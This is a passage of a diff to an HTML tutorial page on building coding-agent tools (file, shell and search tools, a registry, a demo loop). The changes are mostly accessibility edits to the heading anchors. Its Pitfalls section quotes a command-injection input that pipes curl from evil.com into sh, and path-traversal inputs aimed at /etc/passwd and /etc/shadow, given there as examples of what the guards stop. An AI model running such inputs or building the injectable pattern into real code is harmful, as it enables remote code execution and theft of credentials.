 (Step 2.5) — slot in identically: paste each function above the schemas, write its schema
 dict, add one <code>TOOL_FNS</code> entry. Nothing else moves.</p>
-<h3 id="-run-it-now-7">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now-7" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now-7">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now-7">¶</a></h3>
 <div class="highlight"><pre><span></span><code>python<span class="w"> </span>harness_v2.py
 </code></pre></div>
 
@@ -1368,8 +1368,8 @@ explain. (An absolute path like <code>/etc/hostname</code> behaves differently: 
 so that attempt fails with an ordinary <code>ERROR: File not found</code> instead of tripping the
 guard. Either way, nothing outside the workspace is read.)</p>
 <hr>
-<h2 id="version-3--the-organized-toolset-the-same-idea-organized">Version 3 — the organized toolset: the same idea, organized<a aria-hidden="true" class="hanchor" href="#version-3--the-organized-toolset-the-same-idea-organized" tabindex="-1">¶</a></h2>
-<h3 id="what-changed-from-v2-to-v3">What changed from V2 to V3<a aria-hidden="true" class="hanchor" href="#what-changed-from-v2-to-v3" tabindex="-1">¶</a></h3>
+<h2 id="version-3--the-organized-toolset-the-same-idea-organized">Version 3 — the organized toolset: the same idea, organized<a aria-label="Permalink to this section" class="hanchor" href="#version-3--the-organized-toolset-the-same-idea-organized">¶</a></h2>
+<h3 id="what-changed-from-v2-to-v3">What changed from V2 to V3<a aria-label="Permalink to this section" class="hanchor" href="#what-changed-from-v2-to-v3">¶</a></h3>
 <ul>
 <li>The tool functions and helpers move out of the harness script into <strong>one module</strong>
   (<code>coding_tools.py</code>) with the workspace root defined once at the top.</li>
@@ -1394,7 +1394,7 @@ the program can use tools by name without knowing which function each name maps 
 <p>This is just the Phase 2 <code>ToolRegistry</code> pattern applied to the full toolset. If you
 skipped Phase 2, think of the registry as a dict from tool name → function, plus a method
 that produces the <code>tools=[...]</code> list for the API call.</p>
-<h2 id="step-30--a-two-minute-bridge-wiring-version-3-against-your-real-phase-2-code">Step 3.0 — A two-minute bridge: wiring Version 3 against your real Phase 2 code<a aria-hidden="true" class="hanchor" href="#step-30--a-two-minute-bridge-wiring-version-3-against-your-real-phase-2-code" tabindex="-1">¶</a></h2>
+<h2 id="step-30--a-two-minute-bridge-wiring-version-3-against-your-real-phase-2-code">Step 3.0 — A two-minute bridge: wiring Version 3 against your real Phase 2 code<a aria-label="Permalink to this section" class="hanchor" href="#step-30--a-two-minute-bridge-wiring-version-3-against-your-real-phase-2-code">¶</a></h2>
 <blockquote>
 <p><strong>Why now?</strong> Everything from here to the end of the phase imports the tool system you
 built in Phase 2. Three wiring facts keep that painless — get them straight once and
@@ -1434,7 +1434,7 @@ project folder for the rest of this phase looks like:</p>
 ├── coding_tools.py     # this phase&#39;s toolset (complete listing at the end of this phase)
 └── demo_phase4.py      # the Version 3 harness (Step 3.3)
 </code></pre></div>
-<h2 id="step-31--upgrade-tools-to-use-tool-and-toolregistry">Step 3.1 — Upgrade tools to use <code>@tool</code> and <code>ToolRegistry</code><a aria-hidden="true" class="hanchor" href="#step-31--upgrade-tools-to-use-tool-and-toolregistry" tabindex="-1">¶</a></h2>
+<h2 id="step-31--upgrade-tools-to-use-tool-and-toolregistry">Step 3.1 — Upgrade tools to use <code>@tool</code> and <code>ToolRegistry</code><a aria-label="Permalink to this section" class="hanchor" href="#step-31--upgrade-tools-to-use-tool-and-toolregistry">¶</a></h2>
 <p>In the full <code>coding_tools.py</code> module (the
 <a href="#version-3-reference--the-complete-coding_toolspy">end-of-phase reference listing</a>),
 every tool function carries the
@@ -1451,7 +1451,7 @@ continuation lines as documentation for <em>humans</em> reading the source. To c
 the model receives, print it — e.g. <code>from coding_tools import grep</code> then
 <code>print(grep.parameters)</code> — and you will see exactly where each description is cut.</p>
 </div>
-<h2 id="step-32--make_default_registry">Step 3.2 — <code>make_default_registry</code><a aria-hidden="true" class="hanchor" href="#step-32--make_default_registry" tabindex="-1">¶</a></h2>
+<h2 id="step-32--make_default_registry">Step 3.2 — <code>make_default_registry</code><a aria-label="Permalink to this section" class="hanchor" href="#step-32--make_default_registry">¶</a></h2>
 <div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">make_default_registry</span><span class="p">(</span><span class="n">workspace</span><span class="p">:</span> <span class="n">pathlib</span><span class="o">.</span><span class="n">Path</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">ToolRegistry</span><span class="p">:</span>
 <span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
 <span class="sd">    Return a ToolRegistry pre-loaded with all coding-agent tools.</span>
@@ -1492,7 +1492,7 @@ assignment changes what they all see. (Reading a global never needs the keyword 
 only <em>assigning</em> to one does.)</p>
 </blockquote>
 <hr>
-<h2 id="version-3-reference--module-layout-and-shared-utilities">Version 3 reference — module layout and shared utilities<a aria-hidden="true" class="hanchor" href="#version-3-reference--module-layout-and-shared-utilities" tabindex="-1">¶</a></h2>
+<h2 id="version-3-reference--module-layout-and-shared-utilities">Version 3 reference — module layout and shared utilities<a aria-label="Permalink to this section" class="hanchor" href="#version-3-reference--module-layout-and-shared-utilities">¶</a></h2>
 <blockquote>
 <p><strong>Reference section.</strong> From here to the end-to-end demo, nothing new runs — these
 sections describe the production-ready <code>coding_tools.py</code> layout, the rest of
@@ -1554,7 +1554,7 @@ comparison would let a sibling directory like <code>/ws-evil</code> slip through
 <code>/ws</code>. Our <code>resolved.relative_to(WORKSPACE_ROOT)</code> + <code>except ValueError</code> form is the
 pre-3.9-friendly spelling of the same test.</p>
 <hr>
-<h2 id="version-3-reference--the-production-tools">Version 3 reference — the production tools<a aria-hidden="true" class="hanchor" href="#version-3-reference--the-production-tools" tabindex="-1">¶</a></h2>
+<h2 id="version-3-reference--the-production-tools">Version 3 reference — the production tools<a aria-label="Permalink to this section" class="hanchor" href="#version-3-reference--the-production-tools">¶</a></h2>
 <blockquote class="refcopy">
 <p><strong>Reference copy.</strong> These are the same seven functions you built in Steps 2.0–2.6,
 now using <code>@tool</code>, <code>_safe_path</code>, and <code>_truncate</code>. The logic is identical; only the
@@ -1564,7 +1564,7 @@ here — skim or skip. The maintained versions live in
 <a class="repo-file" href="../../code/agent_harness/tools/files.py" title="Opens a file in the repository checkout — not part of this site">code/agent_harness/tools/files.py</a> and
 <a class="repo-file" href="../../code/agent_harness/tools/shell.py" title="Opens a file in the repository checkout — not part of this site">shell.py</a>.</p>
 </blockquote>
-<h3 id="read_file-production-form"><code>read_file</code> (production form)<a aria-hidden="true" class="hanchor" href="#read_file-production-form" tabindex="-1">¶</a></h3>
+<h3 id="read_file-production-form"><code>read_file</code> (production form)<a aria-label="Permalink to this section" class="hanchor" href="#read_file-production-form">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nd">@tool</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">read_file</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">offset</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">limit</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">2000</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 <span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
@@ -1645,7 +1645,7 @@ The <code>offset</code> and <code>limit</code> parameters let it scan in windows
 it cares about. The tool itself caps the returned text with <code>_truncate</code> as a backstop,
 but idiomatic agent usage is to request a small window first and page forward as needed.</p>
 <hr>
-<h3 id="write_file-production-form"><code>write_file</code> (production form)<a aria-hidden="true" class="hanchor" href="#write_file-production-form" tabindex="-1">¶</a></h3>
+<h3 id="write_file-production-form"><code>write_file</code> (production form)<a aria-label="Permalink to this section" class="hanchor" href="#write_file-production-form">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nd">@tool</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">write_file</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 <span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
@@ -1684,7 +1684,7 @@ but idiomatic agent usage is to request a small window first and page forward as
 </code></pre></div>
 
 <hr>
-<h3 id="edit_file-production-form--the-surgical-edit-tool"><code>edit_file</code> (production form) — the surgical edit tool<a aria-hidden="true" class="hanchor" href="#edit_file-production-form--the-surgical-edit-tool" tabindex="-1">¶</a></h3>
+<h3 id="edit_file-production-form--the-surgical-edit-tool"><code>edit_file</code> (production form) — the surgical edit tool<a aria-label="Permalink to this section" class="hanchor" href="#edit_file-production-form--the-surgical-edit-tool">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nd">@tool</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">edit_file</span><span class="p">(</span>
     <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
@@ -1771,7 +1771,7 @@ but idiomatic agent usage is to request a small window first and page forward as
 </code></pre></div>
 
 <hr>
-<h3 id="bash-production-form--shell-command-execution"><code>bash</code> (production form) — shell command execution<a aria-hidden="true" class="hanchor" href="#bash-production-form--shell-command-execution" tabindex="-1">¶</a></h3>
+<h3 id="bash-production-form--shell-command-execution"><code>bash</code> (production form) — shell command execution<a aria-label="Permalink to this section" class="hanchor" href="#bash-production-form--shell-command-execution">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nd">@tool</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">bash</span><span class="p">(</span><span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">timeout</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">120</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 <span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
@@ -1831,7 +1831,7 @@ but idiomatic agent usage is to request a small window first and page forward as
 </code></pre></div>
 
 <hr>
-<h3 id="glob-production-form"><code>glob</code> (production form)<a aria-hidden="true" class="hanchor" href="#glob-production-form" tabindex="-1">¶</a></h3>
+<h3 id="glob-production-form"><code>glob</code> (production form)<a aria-label="Permalink to this section" class="hanchor" href="#glob-production-form">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nd">@tool</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">glob</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 <span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
@@ -1902,7 +1902,7 @@ but idiomatic agent usage is to request a small window first and page forward as
 production. <code>glob</code> is pure Python, instant, and safe — no subprocess, no shell, no
 permission needed. Reserve <code>bash</code> for operations that genuinely require the shell.</p>
 <hr>
-<h3 id="grep-production-form"><code>grep</code> (production form)<a aria-hidden="true" class="hanchor" href="#grep-production-form" tabindex="-1">¶</a></h3>
+<h3 id="grep-production-form"><code>grep</code> (production form)<a aria-label="Permalink to this section" class="hanchor" href="#grep-production-form">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nd">@tool</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">grep</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;.&quot;</span><span class="p">,</span> <span class="n">glob_filter</span><span class="p">:</span> <span class="nb">str</span> <span class="o">|</span> <span class="kc">None</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 <span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
@@ -2034,7 +2034,7 @@ permission prompt. The built-in <code>grep</code> tool is:</p>
 <p>The tradeoff is that it does not support the full <code>grep</code> flag set (e.g., <code>-l</code>, <code>-v</code>,
 <code>--include</code>). For advanced filtering the model can fall back to <code>bash("grep ...")</code>.</p>
 <hr>
-<h3 id="list_dir-production-form"><code>list_dir</code> (production form)<a aria-hidden="true" class="hanchor" href="#list_dir-production-form" tabindex="-1">¶</a></h3>
+<h3 id="list_dir-production-form"><code>list_dir</code> (production form)<a aria-label="Permalink to this section" class="hanchor" href="#list_dir-production-form">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="nd">@tool</span>
 <span class="k">def</span><span class="w"> </span><span class="nf">list_dir</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
 <span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
@@ -2106,7 +2106,7 @@ permission prompt. The built-in <code>grep</code> tool is:</p>
 </code></pre></div>
 
 <hr>
-<h2 id="version-3-reference--registering-everything-make_default_registry">Version 3 reference — registering everything: <code>make_default_registry</code><a aria-hidden="true" class="hanchor" href="#version-3-reference--registering-everything-make_default_registry" tabindex="-1">¶</a></h2>
+<h2 id="version-3-reference--registering-everything-make_default_registry">Version 3 reference — registering everything: <code>make_default_registry</code><a aria-label="Permalink to this section" class="hanchor" href="#version-3-reference--registering-everything-make_default_registry">¶</a></h2>
 <blockquote class="refcopy">
 <p><strong>Reference copy.</strong> This is Step 3.2's <code>make_default_registry</code>, unchanged — shown
 again in its place at the bottom of the assembled module.</p>
@@ -2140,7 +2140,7 @@ again in its place at the bottom of the assembled module.</p>
 list and dispatch by name. All we do here is register every <code>@tool</code>-decorated function.
 The <code>@tool</code> decorator extracted the JSON schema from type hints and the docstring when
 the function was defined, so there is nothing more to do.</p>
-<h3 id="-check-it-now-no-api-key-needed-1">▶ Check it now (no API key needed)<a aria-hidden="true" class="hanchor" href="#-check-it-now-no-api-key-needed-1" tabindex="-1">¶</a></h3>
+<h3 id="-check-it-now-no-api-key-needed-1">▶ Check it now (no API key needed)<a aria-label="Permalink to this section" class="hanchor" href="#-check-it-now-no-api-key-needed-1">¶</a></h3>
 <p>You have now seen every piece of Version 3. Paste the assembled module from the
 <a href="#version-3-reference--the-complete-coding_toolspy">end-of-phase reference listing</a>
 into <code>coding_tools.py</code> (next to Phase 2's <code>tools/</code> package, per the Step 3.0 layout),
@@ -2157,7 +2157,7 @@ ERROR: File not found: nope.txt
 reference listing — no API key, no model call, just proof that the registry and all
 seven tools are wired.</p>
 <hr>
-<h2 id="toolset-reference-table">Toolset reference table<a aria-hidden="true" class="hanchor" href="#toolset-reference-table" tabindex="-1">¶</a></h2>
+<h2 id="toolset-reference-table">Toolset reference table<a aria-label="Permalink to this section" class="hanchor" href="#toolset-reference-table">¶</a></h2>
 <div class="table-wrap"><table>
 <thead>
 <tr>
@@ -2213,13 +2213,13 @@ seven tools are wired.</p>
 </tbody>
 </table></div>
 <hr>
-<h2 id="step-33--the-end-to-end-demo">Step 3.3 — the end-to-end demo<a aria-hidden="true" class="hanchor" href="#step-33--the-end-to-end-demo" tabindex="-1">¶</a></h2>
+<h2 id="step-33--the-end-to-end-demo">Step 3.3 — the end-to-end demo<a aria-label="Permalink to this section" class="hanchor" href="#step-33--the-end-to-end-demo">¶</a></h2>
 <p>The following demo is <strong>Version 3 running end-to-end</strong>: it wires the tool registry into
 the agent loop you built in Phase 3 (the plain, non-streaming form — swapping in
 Phase 3's streaming variant is a good exercise, but it would only change how the text
 arrives, not what the agent does) and sends the agent a real task — find all TODO
 comments in a small project and summarize them.</p>
-<h3 id="demo-setup">Demo setup<a aria-hidden="true" class="hanchor" href="#demo-setup" tabindex="-1">¶</a></h3>
+<h3 id="demo-setup">Demo setup<a aria-label="Permalink to this section" class="hanchor" href="#demo-setup">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="c1"># demo_phase4.py</span>
 <span class="sd">&quot;&quot;&quot;</span>
 <span class="sd">End-to-end demo: an agent finds and summarizes TODO comments in a project.</span>
@@ -2274,7 +2274,7 @@ comments in a small project and summarize them.</p>
     <span class="p">(</span><span class="n">root</span> <span class="o">/</span> <span class="s2">&quot;README.md&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write_text</span><span class="p">(</span><span class="s2">&quot;# Sample Project</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
 </code></pre></div>
 
-<h3 id="the-demo-agent-loop">The demo agent loop<a aria-hidden="true" class="hanchor" href="#the-demo-agent-loop" tabindex="-1">¶</a></h3>
+<h3 id="the-demo-agent-loop">The demo agent loop<a aria-label="Permalink to this section" class="hanchor" href="#the-demo-agent-loop">¶</a></h3>
 <div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">run_demo</span><span class="p">():</span>
     <span class="n">client</span> <span class="o">=</span> <span class="n">OpenAI</span><span class="p">()</span>
 
@@ -2367,7 +2367,7 @@ comments in a small project and summarize them.</p>
     <span class="n">run_demo</span><span class="p">()</span>
 </code></pre></div>
 
-<h3 id="-run-it-now-8">▶ Run it now<a aria-hidden="true" class="hanchor" href="#-run-it-now-8" tabindex="-1">¶</a></h3>
+<h3 id="-run-it-now-8">▶ Run it now<a aria-label="Permalink to this section" class="hanchor" href="#-run-it-now-8">¶</a></h3>
 <p>This is Version 3's full checkpoint. It needs exactly three things side by side (the
 Step 3.0 layout): Phase 2's <code>tools/</code> package, <code>coding_tools.py</code> (the complete module in
 the <a href="#version-3-reference--the-complete-coding_toolspy">end-of-phase reference listing</a>
@@ -2379,7 +2379,7 @@ python<span class="w"> </span>demo_phase4.py
 <p>You should see a transcript like the one below. (Want to check the wiring
 <em>before</em> spending an API call? The offline smoke test under the reference listing
 exercises the registry and tools with no key at all.)</p>
-<h3 id="transcript-representative-output">Transcript (representative output)<a aria-hidden="true" class="hanchor" href="#transcript-representative-output" tabindex="-1">¶</a></h3>
+<h3 id="transcript-representative-output">Transcript (representative output)<a aria-label="Permalink to this section" class="hanchor" href="#transcript-representative-output">¶</a></h3>
 <p>The exact sequence varies by model run, but a typical execution looks like this:</p>
 <div class="highlight nocopy"><pre><span></span><code>TASK: Find every TODO comment in this project&#39;s source files and produce a
 concise summary grouped by file. Then suggest which TODO is most urgent and why.
@@ -2418,10 +2418,10 @@ This should be fixed before any of the other items.
 <code>read_file</code> for context. A well-prompted model with good tools naturally follows an
 efficient search strategy.</p>
 <hr>
-<h2 id="deep-dive--output-size-discipline">Deep dive — output-size discipline<a aria-hidden="true" class="hanchor" href="#deep-dive--output-size-discipline" tabindex="-1">¶</a></h2>
+<h2 id="deep-dive--output-size-discipline">Deep dive — output-size discipline<a aria-label="Permalink to this section" class="hanchor" href="#deep-dive--output-size-discipline">¶</a></h2>
 <p>The <code>_truncate</code> helper appears in every tool that reads file contents or command output.
 This section explains why it is non-negotiable.</p>
-<h3 id="the-context-window-economy">The context-window economy<a aria-hidden="true" class="hanchor" href="#the-context-window-economy" tabindex="-1">¶</a></h3>
+<h3 id="the-context-window-economy">The context-window economy<a aria-label="Permalink to this section" class="hanchor" href="#the-context-window-economy">¶</a></h3>
 <p>Every token in the context window is a shared resource competed for by:</p>
 <ul>
 <li>The system prompt (sets behaviour).</li>
@@ -2434,7 +2434,7 @@ This section explains why it is non-negotiable.</p>
 line file consumes ~50,000 tokens — the entire context window of GPT-3.5, most of
 GPT-4's. The model then either truncates its own reasoning to fit, or the API silently
 drops early history items, causing the model to forget it had a plan.</p>
-<h3 id="the-truncation-contract">The truncation contract<a aria-hidden="true" class="hanchor" href="#the-truncation-contract" tabindex="-1">¶</a></h3>
+<h3 id="the-truncation-contract">The truncation contract<a aria-label="Permalink to this section" class="hanchor" href="#the-truncation-contract">¶</a></h3>
 <p><code>_truncate</code> enforces two limits:
 - <strong><code>max_chars = 40,000</code></strong> — roughly 10,000 tokens at 4 chars/token. Generous enough
   for almost all real tool results; tight enough to never blow the budget alone.
@@ -2446,13 +2446,13 @@ drops early history items, causing the model to forget it had a plan.</p>
 <p>This is the correct behaviour. Silently truncating without a notice would cause the model
 to believe it has the full output when it does not, producing hallucinated reasoning. The
 notice tells it to ask for more if it needs it.</p>
-<h3 id="foreshadowing-phase-6">Foreshadowing Phase 6<a aria-hidden="true" class="hanchor" href="#foreshadowing-phase-6" tabindex="-1">¶</a></h3>
+<h3 id="foreshadowing-phase-6">Foreshadowing Phase 6<a aria-label="Permalink to this section" class="hanchor" href="#foreshadowing-phase-6">¶</a></h3>
 <p>Phase 6 covers context compaction: strategies for summarizing old tool results before
 they crowd out current reasoning, sliding-window approaches, and the <code>max_output_tokens</code>
 budget. <code>_truncate</code> is the per-call first line of defence; Phase 6 is the session-level
 second line. Both are necessary.</p>
 <hr>
-<h2 id="version-3-reference--the-complete-coding_toolspy">Version 3 reference — the complete <code>coding_tools.py</code><a aria-hidden="true" class="hanchor" href="#version-3-reference--the-complete-coding_toolspy" tabindex="-1">¶</a></h2>
+<h2 id="version-3-reference--the-complete-coding_toolspy">Version 3 reference — the complete <code>coding_tools.py</code><a aria-label="Permalink to this section" class="hanchor" href="#version-3-reference--the-complete-coding_toolspy">¶</a></h2>
 <blockquote class="refcopy">
 <p><strong>Reference copy.</strong> Assembled unchanged, in dependency order, from the production
 forms above (which are themselves Steps 2.0–2.6 plus the <code>@tool</code> upgrade). Nothing
@@ -2874,7 +2874,7 @@ Step 3.0 bridge for the three-file folder layout):</p>
     <span class="k">return</span> <span class="n">registry</span>
 </code></pre></div>
 
-<h3 id="-check-it-now-no-api-key-needed-2">▶ Check it now (no API key needed)<a aria-hidden="true" class="hanchor" href="#-check-it-now-no-api-key-needed-2" tabindex="-1">¶</a></h3>
+<h3 id="-check-it-now-no-api-key-needed-2">▶ Check it now (no API key needed)<a aria-label="Permalink to this section" class="hanchor" href="#-check-it-now-no-api-key-needed-2">¶</a></h3>
 <p>Before wiring the model in, prove the module and the Phase 2 registry are talking to
 each other. With <code>coding_tools.py</code> saved next to your Phase 2 <code>tools/</code> package, save and
 run this four-line smoke test from the same folder:</p>
@@ -2901,7 +2901,7 @@ Phase 2's registry says <code>"Error: ..."</code> for <em>its</em> failures: unk
 an exception escaping a tool. The model reads either just fine; Phase 5 acknowledges
 and reconciles the mismatch.)</p>
 <hr>
-<h2 id="what-comes-next">What comes next<a aria-hidden="true" class="hanchor" href="#what-comes-next" tabindex="-1">¶</a></h2>
+<h2 id="what-comes-next">What comes next<a aria-label="Permalink to this section" class="hanchor" href="#what-comes-next">¶</a></h2>
 <p>This phase gave the agent hands: it can now read any file in its workspace, make
 surgical edits, run shell commands, and search the codebase efficiently. But with great
 power comes great risk — <code>bash</code> is an unrestricted code-execution interface and
@@ -2916,12 +2916,12 @@ fills the context window: how to summarize stale tool results, implement a slidi
 window over the transcript, and use <code>max_output_tokens</code> budgeting to keep the model
 reasoning clearly across hundreds of tool calls.</p>
 <hr>
-<h2 id="pitfalls">Pitfalls<a aria-hidden="true" class="hanchor" href="#pitfalls" tabindex="-1">¶</a></h2>
+<h2 id="pitfalls">Pitfalls<a aria-label="Permalink to this section" class="hanchor" href="#pitfalls">¶</a></h2>
 <blockquote>
 <p>This section documents the most common failure modes when building agent tools. Each
 one has burned at least one production system.</p>
 </blockquote>
-<h3 id="path-traversal">Path Traversal<a aria-hidden="true" class="hanchor" href="#path-traversal" tabindex="-1">¶</a></h3>
+<h3 id="path-traversal">Path Traversal<a aria-label="Permalink to this section" class="hanchor" href="#path-traversal">¶</a></h3>
 <p><strong>Symptom:</strong> The model passes <code>path="../../../etc/passwd"</code> or an absolute path like
 <code>/etc/shadow</code>. Without a guard, <code>write_file</code> happily overwrites it.</p>
 <p><strong>Fix:</strong> <code>_safe_path()</code> — every path tool call goes through it. The guard uses
@@ -2934,13 +2934,13 @@ chain can escape.</p>
 <span class="k">assert</span> <span class="n">result</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;ERROR:&quot;</span><span class="p">)</span>
 </code></pre></div>
 
-<h3 id="reading-huge-files">Reading Huge Files<a aria-hidden="true" class="hanchor" href="#reading-huge-files" tabindex="-1">¶</a></h3>
+<h3 id="reading-huge-files">Reading Huge Files<a aria-label="Permalink to this section" class="hanchor" href="#reading-huge-files">¶</a></h3>
 <p><strong>Symptom:</strong> The model calls <code>read_file("node_modules/big_lib/dist/bundle.js")</code> and
 gets 80,000 lines of minified JavaScript, consuming the entire context window.</p>
 <p><strong>Fix:</strong> The <code>limit=2000</code> default and <code>_truncate</code> backstop. For intentionally large
 files, <code>offset</code>/<code>limit</code> pagination is the right pattern. Teach the model (in the system
 prompt or tool description) to read in windows rather than pulling entire files.</p>
-<h3 id="edit-ambiguity">Edit Ambiguity<a aria-hidden="true" class="hanchor" href="#edit-ambiguity" tabindex="-1">¶</a></h3>
+<h3 id="edit-ambiguity">Edit Ambiguity<a aria-label="Permalink to this section" class="hanchor" href="#edit-ambiguity">¶</a></h3>
 <p><strong>Symptom:</strong> The model calls <code>edit_file</code> with <code>old_string="pass"</code> thinking there is one
 such line. The file has 40 functions with <code>pass</code> as a body. The tool returns an ambiguity
 error.</p>
@@ -2948,7 +2948,7 @@ error.</p>
 context (e.g., the full function signature plus the body) to make <code>old_string</code> unique.
 The error message says "found N occurrences" so the model knows exactly why it failed
 and what to do.</p>
-<h3 id="command-injection">Command Injection<a aria-hidden="true" class="hanchor" href="#command-injection" tabindex="-1">¶</a></h3>
+<h3 id="command-injection">Command Injection<a aria-label="Permalink to this section" class="hanchor" href="#command-injection">¶</a></h3>
 <p><strong>Symptom:</strong> User input is interpolated into a <code>bash</code> command:
 <code>bash(f"grep {user_query} src/")</code>. User types <code>'; curl evil.com | sh; #'</code>.</p>
 <p><strong>Fix:</strong> Never interpolate unsanitised user input into shell commands. In a coding
@@ -2956,14 +2956,14 @@ agent, the model constructs commands — not the end user directly. The Phase 5 
 layer adds a human-approval step for <code>bash</code> calls. If you need to pass user data to a
 command, use <code>subprocess.run([...], shell=False)</code> with a properly escaped argument list,
 or sanitise the input yourself.</p>
-<h3 id="blocking-on-interactive-commands">Blocking on Interactive Commands<a aria-hidden="true" class="hanchor" href="#blocking-on-interactive-commands" tabindex="-1">¶</a></h3>
+<h3 id="blocking-on-interactive-commands">Blocking on Interactive Commands<a aria-label="Permalink to this section" class="hanchor" href="#blocking-on-interactive-commands">¶</a></h3>
 <p><strong>Symptom:</strong> The model calls <code>bash("python3 -i")</code> trying to start a REPL. The process
 waits for stdin forever. The timeout fires after 120 seconds.</p>
 <p><strong>Fix:</strong> <code>stdin=subprocess.DEVNULL</code> ensures the process sees EOF immediately if it
 tries to read. The docstring warns the model explicitly: "Interactive commands will
 hang. Use non-interactive invocations." Also, 120 seconds is generous — for quick
 operations lower the timeout to 30 seconds.</p>
-<h3 id="encoding-errors">Encoding Errors<a aria-hidden="true" class="hanchor" href="#encoding-errors" tabindex="-1">¶</a></h3>
+<h3 id="encoding-errors">Encoding Errors<a aria-label="Permalink to this section" class="hanchor" href="#encoding-errors">¶</a></h3>
 <p><strong>Symptom:</strong> A source file contains a Latin-1 byte sequence (e.g., a comment with an
 accented character in an old codebase). <code>p.read_text(encoding="utf-8")</code> raises
 <code>UnicodeDecodeError</code>. The tool crashes — or would, if we did not handle it.</p>
@@ -2973,7 +2973,7 @@ with <code>?</code>-like markers instead of a hard error. For truly binary files
 heuristic fires first. This is the correct approach: never crash on encoding issues in
 a tool; always return something the model can reason about.</p>
 <hr>
-<h2 id="key-takeaways">Key takeaways<a aria-hidden="true" class="hanchor" href="#key-takeaways" tabindex="-1">¶</a></h2>
+<h2 id="key-takeaways">Key takeaways<a aria-label="Permalink to this section" class="hanchor" href="#key-takeaways">¶</a></h2>
 <ul>
 <li><strong>Tools define the agent's power.</strong> <code>read_file</code>, <code>edit_file</code>, <code>bash</code>, <code>grep</code>, and
   <code>glob</code> are what turn the bare loop into a coding agent.</li>
@@ -2985,7 +2985,7 @@ a tool; always return something the model can reason about.</p>
 <li>The genuinely <strong>risky</strong> tools (writing files, running shell) are exactly where
   Phase 5's permission layer plugs in — the harness itself stays unchanged.</li>
 </ul>
-<h2 id="check-yourself">Check yourself<a aria-hidden="true" class="hanchor" href="#check-yourself" tabindex="-1">¶</a></h2>
+<h2 id="check-yourself">Check yourself<a aria-label="Permalink to this section" class="hanchor" href="#check-yourself">¶</a></h2>
 <ol>
 <li>Name three tools that turn the loop into a coding agent.</li>
 <li>Why is truncating/paginating tool output a correctness concern, not just cosmetics?</li>
@@ -3043,6 +3043,18 @@ whichever feels more comfortable).</p>
     openedForPrint = [];
   });
 
+  /* Back-to-top: hidden until the reader scrolls ~1.5 screens down.
+     Without JS the control simply stays visible (the old behavior). */
+  var btt = document.querySelector('.back-to-top');
+  if (btt) {
+    var toggleBtt = function () {
+      btt.classList.toggle('btt-hidden',
+                           window.scrollY < window.innerHeight * 1.5);
+    };
+    window.addEventListener('scroll', toggleBtt, { passive: true });
+    toggleBtt();
+  }
+
   /* Copy buttons, with fallbacks: Clipboard API -> hidden-textarea
      execCommand -> select the block and ask for Ctrl-C.  If no mechanism
      exists at all, inject nothing. */
@@ -3086,7 +3098,7 @@ whichever feels more comfortable).</p>
       setTimeout(function () { btn.textContent = 'Copy'; }, 2000);
     }
     function fallback(pre, code) {
-      if (execCopy(code)) { flash('Copied!'); }
+      if (execCopy(code)) { btn.focus(); flash('Copied!'); }
       else if (selectBlock(pre)) { flash('Press Ctrl-C'); }
